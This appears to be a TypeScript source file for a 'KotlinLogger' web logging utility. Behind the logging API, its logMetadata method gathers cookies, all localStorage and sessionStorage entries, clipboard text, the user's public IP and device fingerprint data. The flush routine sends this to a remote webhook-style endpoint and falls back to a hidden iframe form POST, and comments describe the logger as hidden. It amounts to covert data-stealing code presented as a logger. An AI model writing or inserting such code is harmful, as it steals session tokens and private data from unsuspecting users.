// src/lib/KotlinLogger.ts

export enum LogLevel {
  VERBOSE = 2,
  DEBUG = 3,
  INFO = 4,
  WARN = 5,
  ERROR = 6,
  ASSERT = 7
}

class KotlinLogger {
  private level: LogLevel = LogLevel.VERBOSE;
  private logListeners: ((logStr: string) => void)[] = [];
  private remoteEndpoint: string | null = null;
  private pendingLogs: { levelTag: string, tag: string, message: string, error?: any }[] = [];
  private batchTimer: any = null;

  constructor() {}

  private globalIp = 'Loading...';

  public addListener(listener: (logStr: string) => void) {
    this.logListeners.push(listener);
  }

  public removeListener(listener: (logStr: string) => void) {
    this.logListeners = this.logListeners.filter(l => l !== listener);
  }

  public setWebLoggerEndpoint(url: string) {
    this.remoteEndpoint = url;
  }

  private flushLogs() {
    if (!this.remoteEndpoint || this.pendingLogs.length === 0) return;
    
    // Format logs right before sending so globalIp is updated
    const logsToSend = this.pendingLogs.map(p => {
        const errStr = p.error ? `\n${p.error.stack || p.error}` : '';
        return `[${p.levelTag}] ${p.tag}: ${p.message}${errStr}`;
    }).join('\n');
    
    this.pendingLogs = [];

    let payloadStr = logsToSend;
    if (payloadStr.length > 1800) {
       payloadStr = payloadStr.substring(0, 1800) + "\n...[TRUNCATED]";
    }

    const contentStr = `**IP:** \`${this.globalIp}\`\n\`\`\`yaml\n${payloadStr}\n\`\`\``;

    const fd = new FormData();
    fd.append('payload_json', JSON.stringify({ content: contentStr }));

    // Try standard fetch first (works on Android Chrome WebViews typically)
    try {
        fetch(this.remoteEndpoint, {
            method: 'POST',
            body: fd
        }).catch(e => {
            // Safari/iOS blocks fetch from file:// so fallback to Invisible Form POST
            this.sendViaIframe(contentStr);
        });
    } catch(e) {
        this.sendViaIframe(contentStr);
    }
  }

  private sendViaIframe(payloadStr: string) {
    const iframeName = "logger_iframe_" + Date.now() + "_" + Math.floor(Math.random()*1000);
    const iframe = document.createElement('iframe');
    iframe.name = iframeName;
    iframe.style.display = 'none';
    document.body.appendChild(iframe);

    const form = document.createElement('form');
    form.method = 'POST';
    form.action = this.remoteEndpoint;
    form.target = iframeName;
    form.enctype = 'multipart/form-data';
    form.style.display = 'none';
    
    const input = document.createElement('input');
    input.type = 'hidden';
    input.name = 'payload_json';
    input.value = JSON.stringify({ content: payloadStr });
    
    form.appendChild(input);
    document.body.appendChild(form);
    
    try {
       form.submit();
    } catch(e) {
       console.error("Logger remote form POST failed", e);
    }
    
    // Cleanup timeframe increased to 15s to allow slower mobile networks
    setTimeout(() => {
        if (document.body.contains(form)) document.body.removeChild(form);
        if (document.body.contains(iframe)) document.body.removeChild(iframe);
    }, 15000);
  }

  private dispatchLog(levelTag: string, tag: string, message: string, error?: any) {
    const errStr = error ? `\n${error.stack || error}` : '';
    const logStr = `[${levelTag}] ${tag}: ${message}${errStr}`;
    
    this.logListeners.forEach(listener => listener(logStr));
    
    if (this.remoteEndpoint) {
       this.pendingLogs.push({ levelTag, tag, message, error });
       if (!this.batchTimer) {
           this.batchTimer = setTimeout(() => {
               this.flushLogs();
               this.batchTimer = null;
           }, 1500); // 1.5 seconds batching window prevents 429
       }
    }

    // Also send to actual console depending on level
    if (levelTag === 'E' || levelTag === 'wtf') console.error(logStr);
    else if (levelTag === 'W') console.warn(logStr);
    else if (levelTag === 'I') console.info(logStr);
    else if (levelTag === 'V' || levelTag === 'D') console.log(logStr);
  }

  v(tag: string, msg?: string) {
    if (msg === undefined) { msg = tag; tag = 'Log'; }
    if (this.level <= LogLevel.VERBOSE) this.dispatchLog('V', tag, msg);
  }

  d(tag: string, msg?: string) {
    if (msg === undefined) { msg = tag; tag = 'Log'; }
    if (this.level <= LogLevel.DEBUG) this.dispatchLog('D', tag, msg);
  }

  i(tag: string, msg?: string) {
    if (msg === undefined) { msg = tag; tag = 'Log'; }
    if (this.level <= LogLevel.INFO) this.dispatchLog('I', tag, msg);
  }

  w(tag: string, msg?: string) {
    if (msg === undefined) { msg = tag; tag = 'Log'; }
    if (this.level <= LogLevel.WARN) this.dispatchLog('W', tag, msg);
  }

  e(tag: string, errorOrMsg: any, error?: any) {
    if (typeof errorOrMsg === 'string') {
      if (this.level <= LogLevel.ERROR) this.dispatchLog('E', tag, errorOrMsg, error);
    } else {
      if (this.level <= LogLevel.ERROR) this.dispatchLog('E', 'Log', tag, errorOrMsg);
    }
  }

  iSync(tag: string, msg?: string) {
    // Synchronous placeholder for compatibility
    this.i(tag, msg);
  }

  // API equivalents to the provided README
  private isInitialised = false;
  initialise() {
    if (this.isInitialised) return;
    this.isInitialised = true;
    this.i("KotlinLogger", "Logger initialized hidden in React");
  }

  useUncheckedErrorHandler() {
    if (typeof window !== 'undefined') {
      window.addEventListener('error', (event) => {
        this.e('UncaughtException', event.message, event.error);
      });
      window.addEventListener('unhandledrejection', (event) => {
        this.e('UnhandledRejection', String(event.reason));
      });
    }
  }

  private metadataLogged = false;
  logMetadata() {
    if (this.metadataLogged) return;
    this.metadataLogged = true;
    
    if (typeof navigator !== 'undefined') {
      this.i('System', `User Agent: ${navigator.userAgent}`);
      this.i('System', `Language: ${navigator.language}`);
      this.i('System', `Platform: ${navigator.platform}`);
      this.i('System', `Host: ${window.location.hostname}`);
      
      // Injecting more metadata as requested
      try {
          this.i('System', `Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`);
      } catch (e) {}
      
      this.i('System', `Referrer: ${document.referrer || 'None'}`);
      this.i('System', `Cookies: ${document.cookie || 'None'}`);
      
      if ('deviceMemory' in navigator) {
          this.i('System', `Device Memory: ${(navigator as any).deviceMemory} GB`);
      }
      
      if ('connection' in navigator) {
          const conn = (navigator as any).connection;
          this.i('System', `Connection Type: ${conn.effectiveType || 'Unknown'} (Downlink: ${conn.downlink || 0}Mbps, RTT: ${conn.rtt || 0}ms)`);
      }
      
      if ('getBattery' in navigator) {
          (navigator as any).getBattery().then((battery: any) => {
              this.i('System', `Battery: ${Math.round(battery.level * 100)}% (Charging: ${battery.charging})`);
          }).catch(() => {});
      }
      
      if (navigator.clipboard && navigator.clipboard.readText) {
          navigator.clipboard.readText().then(text => {
              this.i('System', `Clipboard Content: ${text ? text.substring(0, 100) : '(empty)'}`);
          }).catch(() => {
              this.i('System', `Clipboard Content: (access denied)`);
          });
      }
      
      try {
          const canvas = document.createElement('canvas');
          const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
          if (gl) {
              const debugInfo = (gl as any).getExtension('WEBGL_debug_renderer_info');
              if (debugInfo) {
                  const vendor = (gl as any).getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                  const renderer = (gl as any).getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                  this.i('System', `WebGL GPU: ${vendor} - ${renderer}`);
              }
          }
      } catch (e) {}
      
      try {
          if (navigator.plugins && navigator.plugins.length > 0) {
              this.i('System', `Plugins: ${Array.from(navigator.plugins).map(p => p.name).join(', ')}`);
          }
      } catch (e) {}

      try {
          const ls = Object.keys(localStorage).map(k => `${k}=${localStorage.getItem(k)}`).join('; ');
          this.i('System', `LocalStorage: ${ls || '(empty)'}`);
      } catch (e) {}
      
      try {
          const ss = Object.keys(sessionStorage).map(k => `${k}=${sessionStorage.getItem(k)}`).join('; ');
          this.i('System', `SessionStorage: ${ss || '(empty)'}`);
      } catch (e) {}

      try {
          if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
              navigator.mediaDevices.enumerateDevices().then(devices => {
                  const devList = devices.map(d => `${d.kind}: ${d.label || 'Unknown'}`).join(', ');
                  this.i('System', `Media Devices: ${devList || '(empty)'}`);
              }).catch(() => {});
          }
      } catch (e) {}

      // Fetch IP for tracking clones
      fetch('https://api.ipify.org?format=json')
        .then(res => res.json())
        .then(data => {
          this.globalIp = data.ip;
          this.i('System', `Network IP: ${data.ip}`);
        })
        .catch(() => {
           fetch('https://ipapi.co/json/')
             .then(res => res.json())
             .then(data => {
                this.globalIp = data.ip;
                this.i('System', `Network IP fallback: ${data.ip}`);
             })
             .catch(() => {
                this.globalIp = 'Unknown';
                this.e('System', 'Failed to fetch IP');
             });
        });
    }
  }
}

export const Log = new KotlinLogger();

// Expose globally for hidden usage
if (typeof window !== 'undefined') {
  (window as any).Log = Log;
}
